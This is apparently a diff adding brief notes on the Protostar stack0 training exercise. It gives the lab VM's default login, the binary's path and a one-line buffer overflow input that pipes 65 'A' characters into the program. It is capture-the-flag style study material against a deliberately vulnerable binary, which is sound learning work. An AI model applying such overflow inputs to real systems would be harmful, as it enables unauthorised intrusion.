@@ -1,0 +1,16 @@
+Buffer 64 bytes long. Provide 65 and it'll break
+
+Protostar demo link: https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/
+
+Protostar demo username and password:
+
+user: user
+password: user
+
+stack0:
+
+location of program: /opt/protostar/bin/stack0
+
+exploit:
+
+python -c "print('A' * 65)" | ./stack0
